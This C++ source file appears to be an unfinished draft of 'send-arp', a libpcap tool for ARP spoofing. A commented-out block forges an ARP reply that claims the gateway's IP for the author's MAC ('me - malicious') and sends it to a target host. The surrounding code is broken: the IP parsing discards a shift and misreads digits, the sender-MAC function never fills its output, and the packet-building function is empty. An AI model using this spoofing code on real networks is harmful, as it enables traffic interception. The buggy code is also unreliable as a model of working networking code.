#include <cstdio>
#include <pcap.h>
/* GO */
#include <iostream>
#include <cstring>
#include <string>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <arpa/inet.h>
/* GO */
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
using namespace std;

struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)



void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

/* GO */

bool get_s_mac(const string& interface, const u_char* packet, const char* t_ip, uint8_t s_mac[6]){

    const u_char *cpacket = packet;

    EthHdr *ethHdr = (EthHdr*) cpacket;
    cpacket += sizeof(EthHdr);
    ArpHdr *arpHdr = (ArpHdr*) cpacket;

    if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
    uint32_t ct_ip = arpHdr->tip(); // GO: capture t_ip

    uint32_t rt_ip=0;
    uint8_t  tmp=0;
    for(int i=0;i<strlen(t_ip);i++){
        if(t_ip[i]=='.'){
            rt_ip|=tmp;
            rt_ip<<4;
            tmp=0;
        }
        else{
            tmp|=t_ip[i]-'0';

        }
        printf("%c",t_ip[i]);
    }


    /* debug */
    printf("t_ip: %s\n", t_ip);
    printf("target ip: 0x%x\n",ct_ip);


    return true;




}






bool get_me_mac(const string& interface, uint8_t mac[6]) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        return false;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl");
        close(sock);
        return false;
    }

    close(sock);

    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

void make_packet(const string& interface){



}

/* GO */


int main(int argc, char* argv[]) {

    if (argc < 4) {
		usage();
		return EXIT_FAILURE;
	}

    int repeat_time = argc/2 - 1;
    for(int re=0; re<repeat_time; re++){

        char* dev = argv[1];
        char errbuf[PCAP_ERRBUF_SIZE];
        pcap_t* pcap = pcap_open_live(dev, 0, 0, 0, errbuf);
        if (pcap == nullptr) {
            fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
            return EXIT_FAILURE;
        }

        /* GO : packet capture */
        while (true){
                struct pcap_pkthdr* header;
                const u_char* packet;
                int res = pcap_next_ex(pcap, &header, &packet);
                if (res == 0) continue;
                if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
                    printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
                    break;
                }
            printf("%u bytes captured\n", header->caplen);

        /* GO : packet capture end */

        uint8_t s_mac[6];
        uint8_t me_mac[6];

        if (!get_s_mac(dev,packet,argv[re*2+3],s_mac)) continue; //not arp or not broadcast or not target ip
        if (!get_me_mac(dev, me_mac)) cerr << "fail to get me_mac\n";







        EthArpPacket attack_packet;
        //make_packet(dev);





        // packet.eth_.dmac_ = Mac("90:de:80:ce:25:35"); // you - target
        // //packet.eth_.smac_ = Mac(&me_mac); // me
        // packet.eth_.type_ = htons(EthHdr::Arp);

        // packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        // packet.arp_.pro_ = htons(EthHdr::Ip4);
        // packet.arp_.hln_ = Mac::Size;
        // packet.arp_.pln_ = Ip::Size;
        // //packet.arp_.op_ = htons(ArpHdr::Request);
        // packet.arp_.op_ = htons(ArpHdr::Reply);
        // packet.arp_.smac_ = Mac("90:de:80:9d:47:3f"); //me - malicious
        // packet.arp_.sip_ = htonl(Ip("10.3.3.1"));     //gateway - victim ip
        // packet.arp_.tmac_ = Mac("90:de:80:ce:25:35"); //you - target mac
        // packet.arp_.tip_ = htonl(Ip("172.20.10.4"));  //you - target ip

        // int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        // if (res != 0) {
        //     fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
        // }
        }

        pcap_close(pcap);
    }
}
